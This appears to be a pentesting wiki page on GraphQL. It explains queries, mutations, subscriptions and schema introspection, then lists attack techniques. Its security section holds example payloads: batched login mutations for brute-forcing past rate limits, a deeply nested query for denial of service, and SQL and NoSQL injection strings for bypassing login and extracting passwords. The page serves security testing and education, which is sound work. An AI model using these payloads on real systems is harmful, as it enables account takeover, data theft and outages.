# GraphQL

[GraphQL](https://spec.graphql.org/) is a query language designed to build client applications by providing an intuitive and flexible syntax and system for describing their data requirements and interactions. GraphQL uses a declarative approach to fetching data, clients can specify exactly what data they need from the API. As a result, GraphQL provides a single endpoint, which allows clients to get the necessary data, instead of multiple endpoints in the case of a REST API.

![](img/graphql-vs-rest.jpeg)

## GraphQL schema

A GraphQL service's collective type system capabilities are referred to as that service's "schema". A schema is defined in terms of the types and directives it supports as well as the root operation types for each kind of operation: query, mutation, and subscription; this determines the place in the type system where those operations begin.

In other words, GraphQL schema consists of the following parts:
- `Resolve-methods` - methods, which implement a functionality of working with data (getting or modifying)
- `Input and output data types` - description of input and output data for resolve-methods

## Root operation types

A schema defines the initial root operation type for each kind of operation it supports:
- query
- mutation
- subscription

### Query

The query root opertation type is used for fetching/reading data. This type must be provided by a GraphQL schema.

```javascript
/**
 * Requests names of all users
 * You also can request another field, e. g. id or email
 */
query {
  allUsers {
    name
  }
}

/**
 * Requests a name of a user with id 1337
 * You also can request another field, e. g. id or email
 */
query {
  allUsers(id: 1337) {
    name
  }
}
```

Notice all fields in the query operation are requested parallelly:

```javascript
/**
 * getUserById and getUserByName will be requested parallelly
 */
query {
  getUserById { ... }
  getUserByName { ... }
}
```

### Mutation

The mutation root operation type is used for creating/updating/deleting data. This type is optional.

```javascript
/**
 * Create new user
 * Requests id, name and email fields in a response
 */
mutation {
  createUser(name:"User", email: "user@website.com") {
    id
    name
    email
  }
}
```

Notice fields in the mutation operation are requested sequentially:

```javascript
/**
 * The operations are invoked in the following sequence:
 *   1. createUser
 *   2. removeLastUser
 */
mutation {
  createUser { ... }
  removeLastUser { ... }
}
```

### Subscription

The subscription root operation type is used for notifying users of any changes, which have occured in a system. This type is optional. It works the following way: a client subscribes on some action and creates a connection with the server (commonly via WebSocket); when this action is occured, the server sends a notification via the created connection.

```javascript
/**
 * When a new User will be created,
 * the server sends the name and email of the new user to a client
 */
subscription {
  newUser {
    name
    email
  }
}
```

## Introspection

GraphQL defines the introspection schema, which is used to ask a GraphQL for information about what queries it supports. Notice developers can forbid introspection of their applications.

```javascript
/**
 * Requests all defined operations
 * The response will contain operations of all types
 * with their name and existing fields
 */
query {
  __schema {
    types {
      name
      fields {
        name
      }
    }
  }
}

/**
 * Requests all operations with a specific type
 * Use the following keywords for specifying the type of operation:
 *  - queryType
 *  - mutationType
 *  - subscriptionType
 * The response will contain operations with a specific type,
 * their name and existing fields
 */
query {
  __schema {
    queryType {
      fields {
        name
        args {
          name
        }
      }
    }
  }
}

/**
 * Requests a specific operation
 * The response will contain a specific operation
 * with its name and existing fields
 */
query {
  __type(name: "allUsers") {
    fields {
      name
    }
  }
}
```

You can also use various GraphQL IDEs or GraphQL Voyager for introspection.

{% embed url="https://github.com/APIs-guru/graphql-voyager" %}

If developers forbided introspection of their applications you can try to obtain the schema with the `clairvoyance`.

{% embed url="https://github.com/nikitastupin/clairvoyance" %}

# Security issues

## Broken access control

GraphQL does not define any access control by design. Developers implement an access contol inside resolve-methods and a business logic code. So try to bypass access control checks with the techniques used in the case of the REST API.

References:
- [Report: Confidential data of users and limited metadata of programs and reports accessible via GraphQL](https://hackerone.com/reports/489146)
- [Report: Insufficient Type Check leading to Developer ability to delete Project, Repository, Group, ...](https://gitlab.com/gitlab-org/gitlab/-/issues/239348)
- [Report: Insufficient Type Check on GraphQL leading to Maintainer delete repository](https://gitlab.com/gitlab-org/gitlab/-/issues/215703)
- Tool: [AutoGraphQL](https://graphql-dashboard.herokuapp.com/) + [How to use guide](https://www.youtube.com/watch?v=JJmufWfVvyU)

## Bypass rate limits

The GraphQL specification allows multiple requests to be sent in a single request by batching them together. If the developers did not implement some mechanism to prevent the sending of batch requests, you could potentially bypass the rate limit by sending queries in a single request.

```javascript
mutation { login(input: { user:"a", password:"password" }) { success } }
mutation { login(input: { user:"b", password:"password" }) { success } }
....
mutation { login(input: { user:"z", password:"password" }) { success } }
```

## Denial of service

By default GraphQL does not restrict length of queries. The GraphQL queries can be nested one inside the other and create cascading requests to the database. As a result, nested queries can be performed in order to cause a denial of service attack:

```javascript
query {
  posts {
    title
    comments {
      comment
      user {
        comments {
          user {
            comments {
              comment
              user {
                comments {
                  comment
                  user {
                    comments {
                      comment
                      user {
                      ...
                      }
                    }
                  }
                }
              }
            }
          }
        }
      }
    }
  }
}
```

## GraphQL injection

Even though GraphQL is strongly typed, SQL and NoSQL injections are still possible since GraphQL is just a layer between the client and the database.

```javascript
mutation { 
    login(input: {
        user: "admin", 
        password: "password' or 1=1 -- -"
    }) { 
        success
    } 
}

mutation {
    users(search: "{password: { $regex: \".*\"}, name:Admin }") {
        id
        name
        password
    }
}
```

## Information disclosure

Often the GraphQL API is exposed a lot of information, such private data, debug information, hidden data or stacktraces.

References:
- [Team object in GraphQL disclosed total number of whitelisted hackers](https://hackerone.com/reports/342978)
- [Team object exposes amount of participants in a private program to non-invited users](https://hackerone.com/reports/380317)

# References

- [GraphQL Specification](https://spec.graphql.org/)
- [Practical GraphQL attack vectors](https://jondow.eu/practical-graphql-attack-vectors/)
- [Public GraphQL APIs](https://github.com/APIs-guru/graphql-apis)
